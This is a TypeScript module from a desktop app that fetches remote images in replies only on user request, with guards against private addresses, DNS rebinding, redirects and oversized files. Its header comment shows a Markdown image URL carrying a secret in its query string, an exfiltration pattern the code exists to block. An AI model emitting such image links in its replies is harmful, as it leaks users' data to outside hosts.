/**
 * An image a reply links to on another host, fetched once the person asks
 * (Markdown's "Load image from <host>"). The renderer's CSP allows no remote
 * image but Haarness Cloud's own marketplace icons, and Markdown loads no
 * remote image by itself, so a reply such as `![x](https://host/?d=secret)`
 * tells that host nothing until then, and this is the only way one reaches
 * the page: as a data URL, fetched without cookies or a referrer, image types
 * only, at most 10 MB, within 15 seconds, and never from this computer or its
 * network.
 */
import { lookup } from "node:dns";
import { request as httpRequest, type IncomingMessage } from "node:http";
import { request as httpsRequest } from "node:https";
import { isIP, type LookupFunction } from "node:net";

export const IMAGE_LIMIT = 10 * 1024 * 1024;
export const IMAGE_TIMEOUT = 15_000;
const REDIRECTS = 4;
/** Types an `<img>` shows. SVG is drawn as an image there: no script, no fetches. */
const TYPES = new Set([
  "image/png",
  "image/jpeg",
  "image/gif",
  "image/webp",
  "image/avif",
  "image/svg+xml",
  "image/bmp",
  "image/x-icon",
  "image/vnd.microsoft.icon",
]);

/** The address an image may come from: http or https, without credentials. */
export function imageAddress(value: unknown): URL {
  if (typeof value !== "string" || value.length > 8192) throw new Error("This is not an image address.");
  let url: URL;
  try {
    url = new URL(value);
  } catch {
    throw new Error("This is not an image address.");
  }
  if (url.protocol !== "http:" && url.protocol !== "https:") throw new Error("Only http and https images load.");
  if (url.username || url.password) throw new Error("Image addresses must not contain credentials.");
  if (!url.hostname) throw new Error("This is not an image address.");
  url.hash = "";
  return url;
}

function ipv4(address: string): number[] | undefined {
  const parts = address.split(".").map(Number);
  return parts.length === 4 && parts.every((part) => Number.isInteger(part) && part >= 0 && part <= 255)
    ? parts
    : undefined;
}

/** The eight 16-bit groups of an IPv6 address, with an embedded IPv4 tail expanded. */
function ipv6(address: string): number[] | undefined {
  let text = address.toLowerCase().replace(/^\[|\]$/g, "").split("%")[0];
  const tail = /(\d+\.\d+\.\d+\.\d+)$/.exec(text)?.[1];
  if (tail) {
    const v4 = ipv4(tail);
    if (!v4) return undefined;
    text = text.slice(0, -tail.length) + ((v4[0] << 8) | v4[1]).toString(16) + ":" + ((v4[2] << 8) | v4[3]).toString(16);
  }
  const halves = text.split("::");
  if (halves.length > 2) return undefined;
  const read = (part: string) => (part ? part.split(":").map((group) => parseInt(group, 16)) : []);
  const head = read(halves[0]);
  const rest = halves.length === 2 ? read(halves[1]) : [];
  const groups =
    halves.length === 2 ? [...head, ...new Array(8 - head.length - rest.length).fill(0), ...rest] : head;
  return groups.length === 8 && groups.every((group) => Number.isInteger(group) && group >= 0 && group <= 0xffff)
    ? groups
    : undefined;
}

/**
 * Whether an IP address is this computer, its network, or anything but an
 * ordinary internet address: loopback, private, shared (CGNAT), link-local
 * (cloud metadata lives there), multicast, reserved or unspecified. An IPv6
 * address that carries an IPv4 one (mapped, NAT64, 6to4) is judged by it.
 */
export function privateAddress(address: string): boolean {
  const v4 = ipv4(address);
  if (v4) {
    const [a, b] = v4;
    return (
      a === 0 ||
      a === 10 ||
      a === 127 ||
      a >= 224 ||
      (a === 100 && b >= 64 && b <= 127) ||
      (a === 169 && b === 254) ||
      (a === 172 && b >= 16 && b <= 31) ||
      (a === 192 && b === 168) ||
      (a === 192 && b === 0 && v4[2] === 0) ||
      (a === 198 && (b === 18 || b === 19))
    );
  }
  const v6 = ipv6(address);
  if (!v6) return true;
  const embedded = (high: number, low: number) =>
    privateAddress([high >> 8, high & 255, low >> 8, low & 255].join("."));
  // ::ffff:a.b.c.d, and the old ::a.b.c.d, which also covers :: and ::1.
  if (v6.slice(0, 5).every((group) => group === 0) && (v6[5] === 0xffff || v6[5] === 0))
    return embedded(v6[6], v6[7]);
  if (v6[0] === 0x64 && v6[1] === 0xff9b) return embedded(v6[6], v6[7]);
  if (v6[0] === 0x2002) return embedded(v6[1], v6[2]);
  return (
    (v6[0] & 0xfe00) === 0xfc00 || // unique local
    (v6[0] & 0xffc0) === 0xfe80 || // link-local
    (v6[0] & 0xffc0) === 0xfec0 || // site-local
    (v6[0] & 0xff00) === 0xff00 || // multicast
    (v6[0] === 0x2001 && v6[1] === 0x0db8) // documentation
  );
}

/** The image type a response declares, when it is one Haarness shows. */
export function imageType(header: string | string[] | undefined): string | undefined {
  const type = (Array.isArray(header) ? header[0] : header)?.split(";")[0].trim().toLowerCase();
  return type && TYPES.has(type) ? type : undefined;
}

export interface ImageOptions {
  limit?: number;
  timeout?: number;
  /**
   * Host names pinned to an address the private-address check lets through.
   * Only end-to-end tests set it (HAARNESS_DESKTOP_TEST), for a fixture server.
   */
  hosts?: Record<string, string>;
}

/**
 * Resolves a host and refuses it when any of its addresses is private. The
 * connection uses the address checked here, so a second answer from DNS
 * cannot point it somewhere else.
 */
function guardedLookup(hosts: Record<string, string>): LookupFunction {
  return ((hostname: string, options: { all?: boolean }, callback: (...args: unknown[]) => void) => {
    const answer = (addresses: { address: string; family: number }[]) =>
      options.all ? callback(null, addresses) : callback(null, addresses[0].address, addresses[0].family);
    const pinned = hosts[hostname];
    if (pinned) return answer([{ address: pinned, family: isIP(pinned) }]);
    lookup(hostname, { all: true, verbatim: true }, (error, addresses) => {
      if (error) return callback(error);
      if (!addresses.length || addresses.some((entry) => privateAddress(entry.address)))
        return callback(new Error(`${hostname} is on this computer or its network, so its images do not load.`));
      answer(addresses);
    });
  }) as unknown as LookupFunction;
}

type Answer = { redirect: URL } | { type: string; body: Buffer };

function get(url: URL, options: Required<ImageOptions>, signal: AbortSignal): Promise<Answer> {
  return new Promise((resolve, reject) => {
    const host = url.hostname.replace(/^\[|\]$/g, "");
    if (isIP(host) && privateAddress(host) && options.hosts[host] === undefined)
      return reject(new Error(`${host} is on this computer or its network, so its images do not load.`));
    const send = url.protocol === "https:" ? httpsRequest : httpRequest;
    // A plain Node request: no cookie jar, no referrer, no proxy credentials.
    const request = send(
      url,
      {
        method: "GET",
        headers: { accept: "image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8", "user-agent": "Haarness Desktop" },
        lookup: guardedLookup(options.hosts),
        signal,
      },
      (response: IncomingMessage) => {
        const status = response.statusCode ?? 0;
        const location = response.headers.location;
        if (status >= 300 && status < 400 && location) {
          response.resume();
          try {
            return resolve({ redirect: imageAddress(new URL(location, url).href) });
          } catch (error) {
            return reject(error);
          }
        }
        if (status !== 200) {
          response.resume();
          return reject(new Error(`The image host answered ${status}.`));
        }
        const type = imageType(response.headers["content-type"]);
        if (!type) {
          response.destroy();
          return reject(new Error("The address is not an image."));
        }
        const tooLarge = () => new Error(`The image is larger than ${Math.round(options.limit / 1024 / 1024)} MB.`);
        if (Number(response.headers["content-length"]) > options.limit) {
          response.destroy();
          return reject(tooLarge());
        }
        const chunks: Buffer[] = [];
        let size = 0;
        response.on("data", (chunk: Buffer) => {
          size += chunk.length;
          if (size > options.limit) {
            response.destroy();
            reject(tooLarge());
          } else chunks.push(chunk);
        });
        response.on("end", () => resolve({ type, body: Buffer.concat(chunks) }));
        response.on("error", reject);
        // A connection that drops mid-image ends without "end"; a settled promise ignores this.
        response.on("close", () => reject(new Error("The image did not finish loading.")));
      },
    );
    request.on("error", reject);
    request.end();
  });
}

/** Fetches the image at `raw` and returns it as a data URL, or throws why it did not load. */
export async function fetchRemoteImage(raw: unknown, options: ImageOptions = {}): Promise<string> {
  const settings = { limit: IMAGE_LIMIT, timeout: IMAGE_TIMEOUT, hosts: {}, ...options };
  const signal = AbortSignal.timeout(settings.timeout);
  let url = imageAddress(raw);
  try {
    for (let hop = 0; hop <= REDIRECTS; hop++) {
      const answer = await get(url, settings, signal);
      if ("redirect" in answer) {
        url = answer.redirect;
        continue;
      }
      return `data:${answer.type};base64,${answer.body.toString("base64")}`;
    }
  } catch (error) {
    if (signal.aborted) throw new Error("The image took too long to load.");
    throw error;
  }
  throw new Error("The image host redirected too many times.");
}
